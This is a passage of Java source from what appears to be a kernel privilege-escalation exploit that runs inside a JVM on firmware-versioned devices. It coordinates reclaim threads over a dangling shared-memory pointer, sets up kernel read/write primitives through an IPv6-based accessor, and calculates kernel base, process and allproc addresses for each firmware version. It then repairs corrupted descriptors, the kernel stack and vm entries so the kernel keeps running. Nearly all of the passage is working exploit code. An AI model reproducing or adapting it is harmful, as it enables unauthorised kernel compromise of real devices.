            if (!Pointer.NULL.equals(this.state.mappedReclaimKernelStackAddress)) {
                DebugStatus.notice("Resetting ready flag");
                this.state.readyFlag.set(false);
            } else {
                DebugStatus.info("Reclaim thread not found");
            }

            // Trigger all threads (except reclaim one) to terminate execution.
            if (!Config.toggleStoppingWorkingThreadsBeforeRemap) {
                finishWorkingThreads();
            } else {
                this.state.destroyFlag.set(true);
                thread_yield();
            }

            DebugStatus.notice("Joining reclaim threads");
            for (int i = 0; i < this.state.reclaimThreads.size(); i++) {
                final Thread thread = (Thread) this.state.reclaimThreads.get(i);
                final ReclaimJob job = (ReclaimJob) this.state.reclaimJobs.get(i);

                if (!job.isTarget()) {
                    DebugStatus.trace("Joining reclaim thread #" + i);
                    try {
                        thread.join();
                    } catch (InterruptedException e) {
                        // ignore
                    }
                } else {
                    DebugStatus.notice("Skipping target reclaim thread #" + i);

                    this.state.targetReclaimThread = thread;
                    this.state.targetReclaimJob = job;
                }
            }

            this.state.reclaimThreads.clear();
            this.state.reclaimJobs.clear();
        } else {
            // Trigger all threads to terminate execution.
            this.state.destroyFlag.set(true);
        }

        boolean succeeded = !Pointer.NULL.equals(this.state.mappedReclaimKernelStackAddress);

        if (succeeded) {
            // Let reclaim thread do blocking read call.
            DebugStatus.debug("Setting ready flag");
            this.state.readyFlag.set(true);

            sleep(Config.TINY_WAIT_PERIOD);

            DebugStatus.notice("Waiting for command processor to start up");
            while (!this.state.targetReclaimJob.isCommandProccesorRunning()) {
                sleep(1000L);
            }
            DebugStatus.notice("Done waiting for command processor to start up");

            // Register the reclaim thread as the current kernel r/w accessor
            KernelReadWrite.setAccessor(new KernelAccessorSlow(this.state.targetReclaimJob.getCommandProcessor(), this.state.mappedReclaimKernelStackAddress));
            DebugStatus.info("Registered slow kernel r/w accessor");

            int swVer = this.libKernel.getSystemSoftwareVersion();
            KernelOffsetsCalculator offsetCalc = new KernelOffsetsCalculator();

            if (classifier != null && offsetCalc.calculate(swVer, classifier, this.state.targetReclaimJob.getJobName())) {
                this.state.threadAddress = offsetCalc.threadAddress;
                this.state.processAddress = offsetCalc.processAddress;
                this.state.ofilesAddress = offsetCalc.processOpenFilesAddress;
                this.state.kbaseAddress = offsetCalc.kernelAddressBase;

                KernelReadWrite.setAccessor(new KernelAccessorIPv6(this.state.ofilesAddress, this.state.kbaseAddress));
                DebugStatus.info("Registered IPv6-based kernel r/w accessor");

                stabilize();

                DebugStatus.info("Thread address: " + this.state.threadAddress);
                DebugStatus.info("This proc address: " + this.state.processAddress);
                DebugStatus.info("Kernel allproc address: " + offsetCalc.allProcAddress);
                if (!KernelPointer.NULL.equals(offsetCalc.kernelAddressBase)) {
                    DebugStatus.info("Kernel data address determined as " + offsetCalc.kernelDataBase);
                    DebugStatus.info("Kernel base address determined as " + this.state.kbaseAddress);

                    try {
                        KernelStackMarkerOffsets kstackOff = new KernelStackMarkerOffsets(swVer);

                        long retOffset = markerOffset + kstackOff.OFFSET_RET_FROM_MARKER;
                        KernelPointer retValue = KernelPointer.valueOf(this.state.stackDataBuffer.readSnapshot64(retOffset));
                        KernelPointer calcKbaseAddress = retValue.inc(kstackOff.OFFSET_KBASE_FROM_RET);
                        if (!calcKbaseAddress.equals(this.state.kbaseAddress)) {
                            DebugStatus.info("Calculated base address from the stack marker differs: " + calcKbaseAddress + " (based on value " + retValue + " from kstack offset 0x" + Long.toHexString(retOffset) + ")");
                        } else {
                            DebugStatus.info("Kernel base address matches the base address calculated from the stack marker");
                        }
                    } catch (SdkSoftwareVersionUnsupportedException e) {
                        DebugStatus.info("Kernel base address cannot be confirmed from the stack marker for the current firmware version");
                    }
                } else {
                    DebugStatus.info("Kernel base address cannot be determined for the current firmware version. Address of allproc is saved in system property: " + PayloadConstants.ALLPROC_ADDRESS_PROPERY);
                    System.setProperty(PayloadConstants.ALLPROC_ADDRESS_PROPERY, Long.toString(offsetCalc.allProcAddress.addr()));
                }

                // Don't need snapshot from marker anymore
                this.state.stackDataBuffer.clearSnapshot();
            } else {
                throw new SdkRuntimeException("Unable to confirm reclaim thread index from its name. A system crash is imminent");
            }
        } else {
            // XXX: Ideally reclaim thread should be cleaned up in this case
            // but since we have some problem we cannot recover things, thus
            // kernel may panic after some time.
            this.state.targetReclaimThread = null;
            this.state.targetReclaimJob = null;
        }

        System.gc();
        DebugStatus.info("JVM garbage collection completed");

        return succeeded;
    }

    protected void waitForCounter(AtomicInteger value, int threshold, String text) {
        int count;

        while (true) {
            count = value.get();
            if (count >= threshold) {
                break;
            }

            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("Waiting for" + text + " (" + count + "/" + threshold + ")");
            }
            thread_yield();
        }

        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Done waiting for" + text + " (" + count + "/" + threshold + ")");
        }
    }

    private void truncateSharedMemorySpecial(int descriptor) throws BadFileDescriptorException, InvalidValueException, OutOfMemoryException {
        // Multiplies the file descriptor number by PAGE_SIZE to get shared memory
        // object size. Having this size we can figure out descriptor of shared memory
        // object that uses dangling pointer.
        this.uniStd.ftruncate(descriptor, Param.ptoa(descriptor));
    }

    //-------------------------------------------------------------------------

    public void stabilize() throws SdkException {
        KernelStabilizer stabilizer = new KernelStabilizer();

        DebugStatus.info("Fixing up shared memory object file");
        stabilizer.fixupSharedMemory(this.state.ofilesAddress, this.state.lookupDescriptor);

        DebugStatus.info("Analyzing corrupted file descriptors");
        this.state.usedDescriptors.remove(new Integer(this.state.lookupDescriptor));
        int fdFixes = stabilizer.fixUsedDescriptors(this.state.ofilesAddress, this.state.usedDescriptors);
        if (fdFixes > 0) {
            DebugStatus.info(fdFixes + " descriptors were detected but not currently touched");
        }

        DebugStatus.info("Fixing up kernel stack");
        stabilizer.fixupKernelStack(this.state.threadAddress);

        DebugStatus.info("Checking vm space");
        int numFixes = stabilizer.fixupVmSpace(this.state.processAddress, this.state.mappedKernelStackAddresses);
        if (numFixes > 0) {
            DebugStatus.info("Fixed " + numFixes + " vm entries");
        }
    }
}
